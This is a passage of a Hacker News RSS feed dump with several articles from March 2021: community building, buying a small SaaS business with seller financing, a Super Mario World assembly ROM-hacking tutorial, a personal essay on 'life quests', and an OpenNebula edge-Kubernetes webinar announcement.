      <li><strong>My take:</strong> If someone does something wonderfully kind, I’ll try to say thanks with a small gift. As much as possible, I’m trying to recognize, rather than incentivize.</li>
    </ul>
  </li>
</ul>



<p>I think part of this is also just treating our community members with respect. Our community is full of incredibly bright, curious, and kind human beings&nbsp;— they’d see right through us if our motivations were related to dollars.</p>

<p>The <em>incredible</em> thing about this approach is that we do end up getting all of those benefits that I listed above — yes, we have a great sales funnel; yes, we have huge reach; yes, we stay in touch with our user needs; yes, we have people contribute work that we could not do ourselves. But we only get to sustain the good vibes (even with our growth) because we stay true to our mission.</p>


<p>That’s okay! But I think you need to be realistic with what you’re going to achieve if you try to build a community. Maybe your team isn’t going to build <em>the</em> <code>&lt;insert field of practice&gt;</code> community, but perhaps there’s ways you can generate goodwill by contributing to adjacent communities.</p>

<p>A lot of this mindset also applies to other interactions with your users, crossing over into the world of “developer experience” (i.e. how easy it is for a developer to be successful with your product) — by putting your user first, you’ll still create a lot of virtuous cycles.</p>

<p>No matter what your mission is, I encourage you to ask not what your community can do for you, but what you can do for your community.</p>



<p>We’ll see, this is my first time writing about community, and I have no idea how it will land.</p>

<p>Here’s a few topics I’m thinking about:</p>
<ul>
  <li>Managing the growth of a community</li>
  <li>Measuring the success of community</li>
  <li>Assessing community-market fit (or: when community isn’t the right strategy)</li>
  <li>What to look for in an early hire</li>
</ul>

<p>If one of these appeals to you, let me know via <a href="https://twitter.com/clairebcarroll/status/1365679922585468931">the bird site</a> or <a href="mailto:hello@clrcrl.com">email</a>.</p>

<hr>

<p>¹If you are reading this, and you have sent an email to someone in the past asking to “pick their brain” via a 30 minute meeting with no agenda, please don’t do this. Instead, send an email that includes the specific questions you are interested in, and don’t assume that the best way to get them answered is via a call.</p>

        </div></div>]]>
            </description>
            <link>https://clrcrl.com/2021/03/03/how-to-build-a-community-why.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26363709</guid>
            <pubDate>Fri, 05 Mar 2021 23:39:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buying a Business for $0 and growing it]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26363301">thread link</a>) | @catchmeifyoucan
<br/>
March 5, 2021 | https://every.to/superorganizers/how-i-bought-a-business-for-0 | <a href="https://web.archive.org/web/*/https://every.to/superorganizers/how-i-bought-a-business-for-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><em>Hiâ€”Dan here. We're continuing Justin Mares's column on side businesses today! You can read previous editions </em><a href="https://every.to/@jwmares" rel="noopener noreferrer" target="_blank"><em>here</em></a><em>.</em></p><p>Before starting <a href="http://kettleandfire.com/" rel="noopener noreferrer" target="_blank">Kettle &amp; Fire</a>, I had a previous life in the SaaS world. I ran growth for a team (Exceptional Cloud Services)&nbsp; that bought small SaaS apps and grew them. We later sold the bundle of businesses to Rackspace for 8 figures, in early 2013.&nbsp;</p><p>When I left Rackspace after the acquisition and went out on my own, I wanted to replicate the model weâ€™d seen so much success with at Exceptional. I wanted to buy and grow my own SaaS business.&nbsp;</p><p>My partner Ryan and I were on the lookout for a business that fulfilled one of the <a href="https://every.to/superorganizers/the-four-kinds-of-side-hustles-2083436" rel="noopener noreferrer" target="_blank">side hustle criteria</a> Iâ€™ve written about before. A strong potential acquisition had to:</p><ul><li>Solve a problem someone is already aware of,</li><li>In a niche where customers are already paying,</li><li>Where the product <em>does not</em> require a lot of maintenance or hand-holding,</li><li>And is profitable or has a no-brainer path to profitability</li></ul><p>In early 2016, we stumbled across Notify: a simple Shopify plugin that would pop up at the bottom of a website, displaying a purchase another customer had recently made.</p><p><img src="https://lh5.googleusercontent.com/snCfaj5_C-1syTXy4LkPpzKMFBlQ52St0OM2P3E_zqzUVp9_Wt58QG4D2o6G3nuXYiamO1LNNi1b_cicP1781j0-BxSHMr0-XxKpoP7qY0ADq-Vq_xrId6tVHnM6keJxQ87B5CSD"></p><p>Once I saw it in action, I immediately installed it on <a href="https://www.kettleandfire.com/" rel="noopener noreferrer" target="_blank">Kettle &amp; Fire</a> and saw a 40% lift in conversionâ€¦ and $1,400 in extra sales (this was 2016â€¦ K&amp;F was a lot smaller then ðŸ™ƒ).</p><p><img src="https://lh5.googleusercontent.com/XaXoTmu3NxGZOEawmBfaPUhytLba2rid3i3Wf6PfomzNiAukmhLSZl-Mu3RFSjQtwZRFE8hle4yE2Ty1y5jHEkCJPv7VfoPxsaQ0cNbkiTu84Vw5JCHa4rF-JYCLi9f5haDumRSe"></p><p>Woah.&nbsp;</p><p>If it helped my site this much, how many others see a similar sales lift? We had a strong hunch that we could buy Notify, add a few features, put some marketing behind it and grow it quite a bit.&nbsp;</p><p>On February 1, we fired off this email:</p><p><img src="https://lh6.googleusercontent.com/HEMvbe7q_x7pz90iv_OjztnMmZgiPL4Pw_QjIlFmh84HsiEX8XA6Q7UuNKALqkx_mmBMZNaufWI_SjIj2JI1Qa8B09dw63vBWYFTiek2YFbd5uZM8-ACoIlpDIq7awjpG6jOm3p4"></p><p>Buying an app, no matter how small, is a lot of work. Iâ€™d tried to purchase other software businesses in the past and understood how hard it was to come to an agreement. The process involves a good bit of legal spend and can fall apart at the drop of a hat: lessons learned after spending $10k on legal for a failed acquisition 12 months prior ðŸ¤¦.&nbsp;</p><p>We first wanted to see how serious Notifyâ€™s owner, Scott, was about selling. We emailed him and grabbed dinner just one week after our first email exchange.</p><p>During dinner, Ryan and I expressed our admiration for what Scott had accomplishedâ€”which was truly impressive. We covered our backgrounds, and shared the many ideas we had for the product that could take it to the next level.&nbsp;</p><p>Dinner went swimmingly and we learned a LOT about the product. Within a day or two, we followed up with super early diligence questions:</p><p><img src="https://lh5.googleusercontent.com/oQNRoVWMgHJ3bEzzDTXffQnVO1ipHtGFyUQkSqBy-M56RTL8wJ1ZL_xE-Aq9caFXoz5FtlQ4Aoa_ON-04u3Su5s4y1A2zT5vIFCznVUFurYclJy1whYDgqmHXXvSyJ2AzJexRqbS"></p><p>After taking four days to review the numbers he sent over, we responded with a Letter of Intent: a legal but non-binding letter showing we were serious about buying the business. An LOI also serves to ensure that both parties are aligned on high-level terms: what weâ€™d pay, when those payments would hit, etc.&nbsp;</p><h2>Actually buying the business</h2><p>Letâ€™s pause here for a second to address some common misconceptions.&nbsp;</p><p>First, it may feel like youâ€™re listening to Uncle Warren Buffett espousing the benefits and strong returns that come from buying a railroad. <em>Thanks Warren, but how the hell does this apply to me?&nbsp;</em></p><p>The truth is, you donâ€™t need a lot (or any) money to buy many of these small businesses. Many small businesses you can actually buy for $0 up front, if you negotiate it properly and find a motivated seller. Where revenue is less than $20K per month, many of the businesses youâ€™re looking at arenâ€™t businesses at all: theyâ€™re jobs. And if you find an owner (like we did) who wants to quit his job, you can make a deal happen. Youâ€™ll get what you want (a revenue-generating business), the seller gets what he wants (his time back and money for his efforts), and everybody wins.&nbsp;</p><p>While negotiating this acquisition, I kept in mind something one of my mentors shared when buying assets. Assuming youâ€™re not in crazy hot competition for something, it often pays to approach deals in a certain way: â€œ<strong>my price, your terms OR your price, my terms.</strong>â€�&nbsp;</p><p>Letâ€™s say we wanted to buy an app for $1M, and wanted to pay for it over 1-2 years with monthly cash payments. Our lovely seller wants to sell for $1.5M.&nbsp;</p><p>In a scenario like this, weâ€™d put in an offer of $1M cash, up-front (his terms, our price) and see if that gets it done. Alternatively, if the seller was firm on price but didnâ€™t care as much about cash right now, weâ€™d offer $1.5M paid out over 1-2 years in monthly cash payments. His price, our terms.&nbsp;</p><p>In this case, we ended up going with the other option for the Notify deal: the price the owner wanted for the company, on our terms.</p><p>Scott, Notifyâ€™s owner, wanted a high (but fair) price, and wanted to have a piece of the upside going forward. We landed on a structure that would reach his goals <em>and</em> allow us to buy the business for literally $0.&nbsp;</p><p>Hereâ€™s how (<em>note: numbers are not actuals</em>):</p><ol><li>We agreed on an overall value of the business: call it $500K.&nbsp;</li><li>We then discussed how much ownership Scott wanted to maintain in the entity going forward. Letâ€™s say we landed at 20%: we then subtracted that ownership from the total purchase price, and had to figure out how to come up with $400K to buy 80% of the business.&nbsp;</li><li>As I said earlier: he chose the price, we chose the terms. Our terms were that weâ€™d buy the business via a series of monthly payments over the next 20 months. So, in our example $400K required purchase amount, weâ€™d pay $20K/mo to buy the business.&nbsp;</li><li>Hereâ€™s the kicker: we structured the deal so that payments would begin 60 days after close. Because the business was already doing more than our monthly payments to the seller, as long as the business didnâ€™t implode (it didnâ€™t ðŸ˜…), <strong>weâ€™d be able to buy the business with its own revenue</strong>. $0 out of our own pockets.&nbsp;</li></ol><p>Once the price and terms were baked into the LOI (and the seller signed), we moved into deeper diligence. Just 23 days after our first email to Scott ðŸ�Žï¸�!&nbsp;</p><p>We asked him to complete a questionnaire about Notifyâ€™s growth, revenue, tools used, etc., as well as give us all the logins related to the business. Over the next two weeks, as we dug into the info he sent us, we worked with a lawyer to pull together an Asset Purchase Agreement (APA)â€”the document that would make the sale official.</p><p>Fast forward to closing day: March 10, 2016. We received a signed APA, and became owners of a business that was generating cash!</p><p>Several years later, Notify has become <a href="http://fomo.com/" rel="noopener noreferrer" target="_blank">Fomo</a>: a software business that does $1M+ each year.&nbsp;</p><p>Though buying a small SaaS business is more competitive now, there are still a ton of opportunities to buy small assets and scale them on the side. If I were to run this strategy again, Iâ€™d focus on a few areas:</p><ol><li>Buying land and putting it on Hipcamp and other camping rental sites (as I discussed in <a href="https://justinmares.substack.com/p/the-next-brand-episode-13" rel="noopener noreferrer" target="_blank">my last newsletter</a>, please God someone reach out to me and help me do this).&nbsp;</li><li>Buying up small apps in the Google Chrome or Mac app store.</li><li>Buying assets on rapidly growing platforms. Could you buy out a Fortnite skins developer? A creator on Roblox? A top theme developer on Webflow or Shopify? A tool on Figma?&nbsp;</li><li>Buying small software businesses in industries tech doesnâ€™t traditionally touch. In my world of CPG (consumer packaged goods) and food, there are a <em>ton</em><strong> </strong>of small software opportunities where a strong operator could buy an asset, tune it up, and do quite well.&nbsp;</li></ol><p>Happy hunting!&nbsp;</p><p><em>Note â€“ this post originally appeared on Justin's newsletter&nbsp;</em><a href="https://justinmares.substack.com/" rel="noopener noreferrer" target="_blank"><em>The Next Brand</em></a><em>.</em></p>
      </div></div>]]>
            </description>
            <link>https://every.to/superorganizers/how-i-bought-a-business-for-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-26363301</guid>
            <pubDate>Fri, 05 Mar 2021 22:55:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FizzBuzz Mario World: Learning Assembly Language and Having Some Fun]]>
            </title>
            <description>
<![CDATA[
Score 126 | Comments 8 (<a href="https://news.ycombinator.com/item?id=26362739">thread link</a>) | @vga805
<br/>
March 5, 2021 | https://computebeauty.com/posts/fbmw/index.html | <a href="https://web.archive.org/web/*/https://computebeauty.com/posts/fbmw/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I've wanted to learn <a href="https://en.wikipedia.org/wiki/Assembly_language" target="_blank">Assembly language (ASM)</a> programming for a long time. I finally found the perfect project to do it: hacking Super Mario World (SMW). It was a lot of fun so I thought I'd document the process.</p><p>The SMW <a href="https://en.wikipedia.org/wiki/ROM_hacking" target="_blank">ROM hacking</a> community is vibrant. It's an impressively talented and creative community that makes a lot of awesome games with custom graphics, music, level design, and game physics. Stumbling upon <a href="https://www.youtube.com/results?search_query=super+mario+world+rom+hack" target="_blank">these hacks</a> on YouTube started me down this rabbit hole.</p><p>TLDR: the code and a list of the resources mentioned in this post can be found on <a href="https://github.com/thoughtbyte/super-fizzbuzz-world" target="_blank">GitHub</a>.</p><h2>FizzBuzz Mario</h2><p><a href="https://en.wikipedia.org/wiki/Fizz_buzz" target="_blank">FizzBuzz</a> is a common problem that beginner programmers solve for practice. The objective is to loop from 1 to 100 and:</p><ul><li>for every number divisible by 3, print 'fizz'</li><li>for every number divisible by 5, print 'buzz'</li><li>for every number divisible by 3 and 5, print 'fizz buzz'</li><li>otherwise print the number</li></ul><p>The goal of this project is to solve a problem similar to FizzBuzz by writing custom ASM that can be patched, or inserted, into the SMW code. The perfect context for FizzBuzz in SMW is the coin count. At any one time the player can have between 0 and 99 coins. Additionally, Mario can have 1 of 4 power-up statuses: small, big, cape, and fire. Here's the behavior we'll hack into our version of SMW:</p><ul><li>when coin count is divisible by 3, set status to big</li><li>when coin count is divisible by 5, set status to cape</li><li>when coin count is divisible by 3 and 5, set status to fire</li><li>otherwise set status to small</li></ul><p>Here's game-play of the finished product:</p><p><iframe title="FizzBuzz Mario World Demo" src="https://www.youtube.com/embed/APwAE0wiGF8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><h2>Getting Started</h2><p>After a few minutes of searching the web I found the source of most of the information I'll be sharing: <a href="https://www.smwcentral.net/" target="_blank">SWM Central</a>. You can find a full list of resources at the end of this article but the guides I found most helpful were Ersanio's <a href="https://ersanio.gitbook.io/assembly-for-the-snes/" target="_blank">Assembly for the SNES</a> and <a href="https://www.smwcentral.net/?p=section&amp;a=details&amp;id=15073" target="_black">Assembly for Super Mario World</a>. The former assumes no knowledge of ASM. The latter refreshes the ASM information from the former and then goes into how to apply a simple patch similar to the one we'll be writing. Both are quick reads and I recommend them to any programmer that wants to know what ASM programming feels like.</p><h3>Memory</h3><p>ASM is a low-level language with which you deal directly with individual bytes of memory. SNES games are comprised of read-only memory (ROM) and random-access memory (RAM). You can think of the ROM as the game cartridge itself. Instead of an actual cartridge and SNES, the ROM for present purposes is a computer file that you can play on a <a href="http://www.snes9x.com/" target="_blank">SNES emulator</a>. The ROM is where all the code for how the game works is stored. This memory, as the name implies, is usually only ever read from. Our goal is to hack this ROM by overwriting a small part of it thus changing how the game behaves.</p><p>The RAM is on the SNES itself and it's where values are stored that will change while the game is played. The coin counter value needs to live in RAM because it changes often. The same goes for the player's power-up status.</p><p>In both ROM and RAM, memory is a long list of addresses where values can be stored. These addresses are represented in <a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank">hexadecimal (hex)</a>. For our purposes we'll need to figure out the memory addresses for three things: the value of the coin count, the value of the power-up status, and where to insert some custom code.</p><p>Fortunately, people have completely disassembled SMW and mapped the RAM and ROM, so finding what we need is a simple web search. The RAM map can be found on <a href="https://www.smwcentral.net/?p=memorymap&amp;game=smw&amp;u=0&amp;address=&amp;sizeOperation=%3D&amp;sizeValue=&amp;region[]=ram&amp;type=*&amp;description=" target="_blank">SMW Central</a>. The RAM begins at address <code>$7E0000</code> and ends at <code>$7FC800</code>. The <code>$</code> indicates hex. By searching a few relevant keywords I found that the coin count is stored at address <code>$7E0019</code> and the power-up status is stored at address <code>$7E0DBF</code>. The entry for power-up status also indicates the 4 possible values for this address and what they mean: 1 for big Mario, 2 for cape Mario, 3 for fire Mario, and 0 for small Mario.</p><p>This gives us a basic idea of what our ASM code will need to do, in pseudocode:</p><pre><code>every time the coin count increases:
  get the value of RAM address $7E0019 (coin count)
  if that value is divisible by 15
    store 3 in RAM address $7E0DBF (power-up status)
  else if that value is divisible by 5
    store 2 in RAM address $7E0DBF
  else if that value is divisible by 3
    store 1 in RAM address $7E0DBF
  else store 0 in RAM address $7E0DBF</code></pre><p>Now we need to figure out where to insert our code. I want this code to run whenever the player gets a coin so I searched for "coin count" within the ROM map and found <code>$008F1D</code>, a 30 byte piece of code that "handles actually increasing the player's coin count and giving a life from 100 coins." This is a good start, but we can't just insert code into 30 bytes of ROM without seeing what it does. We will break everything if we're not careful. Unfortunately the ROM map on SWM Central doesn't have the actual code stored at this address. But then I found <a href="https://www.smwcentral.net/?p=section&amp;a=details&amp;id=21822" target="_blank">All.log++</a>: a complete disassembly of the SMW source code, in ASM, with extensive comments and labels.</p><p>Inspecting the disassembled SMW source code at this coin count code address, I noticed that the address where the coin count is actually increased is <code>$008F25</code>. That is, this is the memory address of ROM that stores the instruction that literally adds 1 to the coin count every single time the player receives 1 coin. But instead of just increasing the coin count by 1, I want to patch the ROM so that when the code at this address gets executed, the SNES <i>also</i> runs my FizzBuzz code.</p><p>Now we have all of the relevant memory addresses that we need, and we have the pseudocode that we need to run at the coin count increase ROM address. Now we assemble.</p><h2>Writing the Code</h2><p>Our first two lines are easy:</p><pre><code>!PowerUpStatus = $0019
!CoinCount = $0DBF</code></pre><p>We simply set the RAM memory addresses that we need for the coin count and power-up status to some labels so they'll be easier to refer to in the code. Notice that we dropped the <code>7E</code> from both addresses. We don't need it. These lines don't actually get patched into the ROM. All occurrences of the labels in the code that we will write will get replaced with the addresses by the assembler. The assembler is the thing that will take our code and insert it into the ROM.</p><h3>Hijacking the Coin Count Increase Code</h3><p>We know where we want to insert our code: the ROM address where the coin count is increased. But we can't insert <i>all</i> of our code into this address, we'll overwrite a lot of stuff and break the game. We can only insert a few bytes, and we have to make sure the bytes that we overwrite are executed by us in our own code so that everything that the original code was supposed to do still happens. So what we'll do is insert one instruction in the ROM at the coin count increase address that tells the processor to <i>jump</i> to the rest of our code. Then we'll tell the assembler to insert our code in some free space so we don't overwrite anything. Here's what that looks like:</p><pre><code>ORG $008F25
JSL FizzBuzz
NOP
NOP

freecode</code></pre><p><code>ORG $008F25</code> instructs the assembler to insert the following instruction, <code>JSL FizzBuzz</code>, into the ROM address where the coin count is increased. What <code>JSL FizzBuzz</code> means is: <b>J</b>ump to the <b>S</b>ubroutine code labeled <code>FizzBuzz</code>. Most ASM operation codes, or opcodes, are menumonic. The J and S are for Jump and Subroutine. We can ignore the L, it's beyond the scope of this.</p><p>What's with the <code>NOP</code>s? As it turns out, the code we've chosen to overwrite, the coin count increase instruction, is 3 bytes long (we know this because All.log++ tells us that). The code we insert, <code>JSL FizzBuzz</code>, is 4 bytes long. So in our attempt to overwrite 1 3 byte long instruction, we overwrote the first byte of a second instruction.</p><p>The fix for this is that we need remember to execute <i>both instructions that we overwrote</i> in the code <i>we</i> write. The second instruction we overwrite, like the first, is 3 bytes long, for a total of 6 bytes. But again, the code we inserted is only 4 bytes: there are still 2 dangling bytes that were previously part of that second instruction. That's not good. Random, partially overwritten bytes in the code will break the game. So, we include 2 <code>NOP</code> instructions. These are <b>N</b>o <b>OP</b>erations. We do nothing for 2 bytes to fill up the space not filled up by the previous 4 bytes of code we inserted. To recap, we overwrote 6 bytes of 2 instructions with 6 bytes of our own instruction that jumps to our custom code.</p><p><code>freecode</code> just means find some free space in the ROM to put the rest of our custom ASM code.</p><h3>The FizzBuzz Subroutine</h3><p>The following code is the beginning of the <code>FizzBuzz</code> subroutine that we referenced above.</p><pre><code>FizzBuzz:
INC !CoinCount
LDA #$0F
STA $00
LDA !CoinCount
JSR Mod</code></pre><p>The first line is the label. The second, <code>INC !CoinCount</code>, means <b>INC</b>rement the value in the memory address for the coin count by 1. This is what the first instruction of the code we overwrote was supposed to do, so we do it here ourselves.</p><p>In ASM, one of the most important things is the <a href="https://en.wikipedia.org/wiki/Accumulator_(computing)" target="_blank">accumulator</a>. Essentially, the accumulator (A) is the memory address where the microprocessor stores its results from math and logic operations. We can also store stuff there for use in math operations. <code>LDA #$0F</code> does just that. It <b>L</b>oa<b>D</b>s into the <b>A</b>ccumulator the value 15. 0F is hex for the decimal value 15, and the # means we want the value 15 itself, not what's stored at the memory address 15.</p><p>We then run <code>STA $00</code>, this <b>ST</b>ores the value of the <b>A</b>ccumulator into memory address <code>$00</code>. This memory address is "scratch" memory that has no assigned purpose other than as a place to store temporary values. We couldn't just store a value directly into <code>$00</code>, instead it was a two-step process: load a value into A, then store the value of A in <code>$00</code>. Next, <code>LDA !CoinCount</code> loads the value of the coin count into A.</p><p>So now we have two values stored in memory: the coin count, stored in A, and 15, stored in <code>$00</code>. To check if something is divisible by 3 and 5, we can divide it by 15 and check if there's a remainder. Many programming languages have a modulo operator that gives you the remainder of 1 number divided by another. For example, 47 modulo 15 is 2. <code>JSR Mod</code> means <b>J</b>ump to the <b>S</b>ub<b>R</b>outine labeled <code>Mod</code>.…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://computebeauty.com/posts/fbmw/index.html">https://computebeauty.com/posts/fbmw/index.html</a></em></p>]]>
            </description>
            <link>https://computebeauty.com/posts/fbmw/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26362739</guid>
            <pubDate>Fri, 05 Mar 2021 22:04:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Life Quests, Not Goals]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361941">thread link</a>) | @rasen58
<br/>
March 5, 2021 | https://himat.github.io/posts/life_quests_not_goals/ | <a href="https://web.archive.org/web/*/https://himat.github.io/posts/life_quests_not_goals/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

      <p>Some people say they have goals that they want to accomplish in life.</p>
<p>I, however, have goals and quests.</p>
<p>I'll explain what quests are, but I would recommend reevaluating your goals and considering turning some of them into quests. If you adopt this framing of quests and goals, then you might be able to better approach some of the things you want to do in life.</p>
<p>This quests and goals mindset is something I thought of in the past few years just because it seemed natural for me to think of things in this way.</p>
<h2 id="what-are-quests">What are quests?</h2>
<p>In many games, you are often given a multitude of quests (like slay 100 trolls, find a chicken in the castle, etc.), and if you complete a quest, you will receive some kind of reward.
These are not goals. For it to be a goal, it would mean that you need to achieve it or else you have lost the game or can't progress forward.</p>
<p>For a quest though, there's no pressure to complete it. You'll have a multitude of quests available to you, and you can freely choose to embark upon the quests that interest you at this time. If you complete a quest, then that's fantastic, and you'll get some kind of reward. If you fail, then sure you may be a bit sad, but perhaps you can try again, and regardless, it was hopefully a fun or educational experience in trying to complete the quest.</p>
<p>In the same way that quests exist in games, you can also set quests for yourself in the game of life. When you set quests for yourself, you're telling yourself that these would be cool things that I would like to do, but if I don't do them or I fail at them, it's not too big of a deal. I'll feel pretty awesome if I do complete a life quest, but I won't feel that bad if I don't.</p>
<p>A life goal on the other hand, would be a task that you think is a critical milestone for who you are in life and what you want to do. You may want to change your goals at some point, or it may not be too terrible if you fail to achieve a goal, but a goal is still probably something important to you. We'll talk more about goals in the next section.</p>
<p>To give you some examples, some of my quests include: being able to draw and sing well. I ideally want to do these things, and they would be very fun to do, but I probably won't direct all my energy towards them.</p>
<h2 id="you-should-still-set-goals">You should still set goals</h2>
<p>I think that more people should think in terms of this quests vs goals mindset.</p>
<p>But, you should still have goals too. It's just that people only have goals right now, whereas some of those “goals” could be quests instead.</p>
<p>For example, a real goal I have is to create something that creates immense value in the world (i.e. some kind of product/service/etc that helps the world). This may happen by me starting a company to do this.</p>
<p>If I don't achieve this, then I actually will feel that I have failed. This is fine by me since this matters to me a lot (of course I'm not going to mope about failing, but I will have to acknowledge that I didn't accomplish this goal at some point if it doesn't work out.) We may not achieve all our goals, but we can have fun trying.</p>
<p>Another one of my goals for my life is to help more people increase and achieve their potentials since I feel that so much more can be created in the world, but that most people are lacking the motivation, guidance, or resources to do more. I’m always trying to do this, so this goal won’t ever be officially completed - it’s an ongoing goal of mine.</p>
<h2 id="side-quests">Side quests</h2>
<p>Not all of your quests will be of the same importance. You might have some big quests in your life that you think would be really great if you accomplished, and there will be other smaller mini / side quests that might just be fun to do, but that you won't often think about.</p>
<p>Some of my side quests include: organizing a random multi-day physically exhausting trip somewhere with two people I don't know that well, and trying to be a long-haul truck driver for a bit.</p>
<p>You might similarly categorize your goals too as small or big goals.</p>
<h2 id="only-quests">Only quests?</h2>
<p>Some people advocate for not setting goals at all and to instead just focus on the process instead of the end result. If you follow that mentality you might consider only setting quests for yourself.</p>
<p>I think that if there's something you really care about though, then you will want to set goals.</p>
<h2 id="why-have-quests">Why have quests?</h2>
<p>The problem I see currently is that some people have way too many goals, which causes them to be confused about which direction to go in, or people have no goals because they think calling something a goal is too serious and they're worried about failing if they say they have a goal.</p>
<p>So if you have way too many goals right now, then I think reconsidering them and figuring out which are the ones really important to you (goals) and which are the ones that would just be cool to do (quests) would help give you better direction. This way, you can now try to go in the direction of your few goals, while maybe doing some quests along the way.</p>
<p>And if you have no goals right now because you are scared of proclaiming this goal loudly and failing, then consider making it a quest. It's totally fine to loudly shout that you have a quest to do something because even if you fail, that's fine!</p>
<p>If you have no goals right now solely because you don't have anything worthy of being a goal, that's fine too! Not everyone needs to have a goal. So instead, just enjoy your time going on fun quests, and who knows, maybe along the way, you'll realize that there is something worthy of becoming a goal :).</p>
<p>Think of your next quest right now before you forget.</p>

      <hr>
      <div>
  <p>
    Receive email notifications for new posts (I might publish a post once every
    few months)
  </p>
  
  
  
</div>

    </div></div>]]>
            </description>
            <link>https://himat.github.io/posts/life_quests_not_goals/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361941</guid>
            <pubDate>Fri, 05 Mar 2021 20:52:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CNCF Webinar on Deploying Kubernetes at the Edge with OpenNebula]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361258">thread link</a>) | @amarti
<br/>
March 5, 2021 | https://opennebula.io/cncf-webinar-kubernetes-at-the-edge/ | <a href="https://web.archive.org/web/*/https://opennebula.io/cncf-webinar-kubernetes-at-the-edge/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
				
				
<p>Back in November 2020, we <a href="https://opennebula.io/opennebula-joins-cncf/">announced</a> that OpenNebula had joined the&nbsp;<strong>Cloud Native Computing Foundation</strong>&nbsp;(CNCF) as a Silver Member 🤓 A couple of weeks later, we launched our CNCF-certified <a href="https://opennebula.io/certified-kubernetes-appliance/">Kubernetes Appliance</a>. And next week we’ll be contributing to the new <strong>CNCF On-Demand Webinar</strong> series with an amazing demo showcasing how to use OpenNebula’s <a href="https://opennebula.io/edge-cloud/">new Edge Computing features</a> to deploy <strong>Kubernetes clusters at the Edge</strong>, in this case for multiplayer gaming! 🎮</p>



<p>Edge computing is becoming increasingly popular thanks to the growing availability of cloud and bare-metal providers like <strong>AWS</strong> and <strong>Equinix Metal</strong> offering flexible and affordable access to edge resources around the globe. Now, thanks to our <a aria-label="ONEedge (opens in a new tab)" href="https://oneedge.io/" target="_blank" rel="noreferrer noopener">ONEedge</a> initiative, we’ve transformed OpenNebula into a powerful, <strong>open source Edge Computing platform</strong>! 🌎 The idea is to offer an easy way for organizations with an on-premises or hosted OpenNebula cloud to quickly leverage edge resources in locations that are closer to their end-users or IoT devices, <strong>improving network latency and user experience</strong>, reducing security risks, and minimizing data transfers to central cloud locations.</p>



<p>In this <a aria-label="CNCF on-demand webinar (opens in a new tab)" href="https://community.cncf.io/events/details/cncf-cncf-online-programs-presents-cncf-on-demand-webinar-deploying-k3s-at-the-edge-for-multiplayer-gaming/" target="_blank" rel="noreferrer noopener">CNCF On-Demand Webinar</a> (available from Thursday, <strong>March 11 </strong>onwards) we’ll show how to easily provision edge resources with the new <a href="https://opennebula.io/opennebula-6-0-mutara-beta-is-out/">OpenNebula 6.0 “Mutara”</a>, and how to deploy <strong>K3s clusters at the Edge</strong> for multiplayer gaming, using <a href="https://opennebula.io/firecracker/">Firecracker</a> and Agones. We’ll combine all these open source technologies to deploy at the edge a dedicated infrastructure for Xonotic, the well-known open source FPS multiplayer game. Let the fun begin! 🚀</p>







<div><figure><a href="https://community.cncf.io/events/details/cncf-cncf-online-programs-presents-cncf-on-demand-webinar-deploying-k3s-at-the-edge-for-multiplayer-gaming/" target="_blank" rel="noopener"><img width="750" height="422" src="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg" alt="CNCF webinar cover" srcset="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg 750w, https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover-480x270.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 750px, 100vw" title="CNCF Webinar - K3s at the Edge for Multiplayer Gaming 1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20750%20422'%3E%3C/svg%3E" data-lazy-srcset="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg 750w, https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover-480x270.jpg 480w" data-lazy-src="https://opennebula.io/wp-content/uploads/2021/03/CNCF_webinar_cover.jpg"></a></figure></div>















<div>
<div>
<figure><a href="https://oneedge.io/" target="_blank" rel="noopener"><img src="https://opennebula.io/wp-content/uploads/2021/03/ONEedge_logo_small.png" alt="ONEedge logo small" width="69" height="43" title="CNCF Webinar - K3s at the Edge for Multiplayer Gaming 2" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2069%2043'%3E%3C/svg%3E" data-lazy-src="https://opennebula.io/wp-content/uploads/2021/03/ONEedge_logo_small.png"></a></figure>
</div>



<p>This work has received funding from the European Union’s Horizon 2020 research and innovation program under grant agreement <strong>ONEedge</strong> 880412  🇪🇺</p>
</div>

			</div></div>]]>
            </description>
            <link>https://opennebula.io/cncf-webinar-kubernetes-at-the-edge/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26361258</guid>
            <pubDate>Fri, 05 Mar 2021 19:53:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS Kernel Hacking Adventures: Memory corruption to root privileges]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26361085">thread link</a>) | @ingve
<br/>
